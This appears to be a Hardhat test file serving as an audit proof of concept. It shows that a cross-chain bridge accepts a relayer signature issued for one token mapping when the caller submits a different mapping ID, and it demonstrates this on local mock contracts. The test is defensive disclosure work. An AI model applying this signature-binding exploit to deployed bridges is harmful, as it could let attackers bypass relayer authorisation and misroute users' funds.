import hre from "hardhat";
import {expect} from "chai";

describe("Finding 1 - mapId/originToken not bound to relayer signature", function () {
  it("accepts a signature issued for map 1 when the caller submits map 2", async function () {
    const [, multisig, emergency, relayer, user] = await hre.ethers.getSigners();

    const Token = await hre.ethers.getContractFactory("PocToken");
    const tokenA = await Token.deploy();
    const tokenB = await Token.deploy();
    const targetToken = await Token.deploy();

    const Mapper = await hre.ethers.getContractFactory(
      "contracts/main/modules/mapper/Mapper.sol:Mapper"
    );
    const mapper = await hre.upgrades.deployProxy(
      Mapper,
      [{ emergencyAddress: emergency.address, multisigAddress: multisig.address }],
      { initializer: "initialize" }
    );
    await mapper.waitForDeployment();

    const Bridge = await hre.ethers.getContractFactory("Bridge");
    const bridge = await hre.upgrades.deployProxy(
      Bridge,
      [{
        mapperAddress: await mapper.getAddress(),
        emergencyAddress: emergency.address,
        multisigAddress: multisig.address,
        relayerAddress: relayer.address
      }],
      { initializer: "initialize" }
    );
    await bridge.waitForDeployment();

    const chainId = (await hre.ethers.provider.getNetwork()).chainId;
    const targetChainId = 999999n;
    const targetTokenAddress = hre.ethers.zeroPadValue(await targetToken.getAddress(), 32);
    const b32 = (address: string) => hre.ethers.zeroPadValue(address, 32);

    const map = (originToken: string) => ({
      originChainId: chainId,
      targetChainId,
      depositType: 1,
      withdrawType: 0,
      originTokenAddress: b32(originToken),
      targetTokenAddress,
      useTransfer: false,
      isAllowed: true,
      isCoin: false
    });

    await (await mapper.connect(multisig).registerMapping(map(await tokenA.getAddress()))).wait();
    await (await mapper.connect(multisig).registerMapping(map(await tokenB.getAddress()))).wait();

    const mapA = await mapper.mapInfo(1n);
    const mapB = await mapper.mapInfo(2n);

    expect(mapA.targetTokenAddress).to.equal(mapB.targetTokenAddress);
    expect(mapA.originTokenAddress).to.not.equal(mapB.originTokenAddress);

    const amount = hre.ethers.parseEther("100");
    await (await tokenB.transfer(user.address, amount)).wait();
    await (await tokenB.connect(user).approve(await bridge.getAddress(), amount)).wait();

    const toAddress = b32(user.address);
    const gasAmount = 0n;
    const deadline = BigInt((await hre.ethers.provider.getBlock("latest"))!.timestamp) + 3600n;
    const salt = hre.ethers.keccak256(hre.ethers.toUtf8Bytes("finding-1-poc"));

    const signedHash = hre.ethers.solidityPackedKeccak256(
      ["address", "bytes32", "bytes32", "uint256", "uint256", "uint256", "uint256", "uint64", "bytes32"],
      [
        user.address,
        toAddress,
        mapA.targetTokenAddress,
        gasAmount,
        amount,
        mapA.originChainId,
        mapA.targetChainId,
        deadline,
        salt
      ]
    );

    const signature = await relayer.signMessage(hre.ethers.getBytes(signedHash));
    const sig = hre.ethers.Signature.from(signature);

    const beforeA = await tokenA.balanceOf(await bridge.getAddress());
    const beforeB = await tokenB.balanceOf(await bridge.getAddress());

    const tx = await bridge.connect(user).bridgeTokens(
      {
        bridgeParams: { mapId: 2n, amount, toAddress },
        ECDSAParams: { r: sig.r, s: sig.s, v: sig.v, deadline, salt }
      },
      { value: gasAmount }
    );

    await expect(tx)
      .to.emit(bridge, "Deposit")
      .withArgs(
        b32(user.address),
        toAddress,
        mapB.originTokenAddress,
        mapB.targetTokenAddress,
        amount,
        mapB.originChainId,
        mapB.targetChainId
      );

    const afterA = await tokenA.balanceOf(await bridge.getAddress());
    const afterB = await tokenB.balanceOf(await bridge.getAddress());

    expect(afterA - beforeA).to.equal(0n);
    expect(afterB - beforeB).to.equal(amount);
    expect(await bridge.usedHashes(signedHash)).to.equal(true);

    const differentTargetHash = hre.ethers.solidityPackedKeccak256(
      ["address", "bytes32", "bytes32", "uint256", "uint256", "uint256", "uint256", "uint64", "bytes32"],
      [
        user.address, toAddress, b32(await tokenA.getAddress()), gasAmount,
        amount, mapB.originChainId, mapB.targetChainId, deadline, salt
      ]
    );
    expect(differentTargetHash).to.not.equal(signedHash);
  });
});
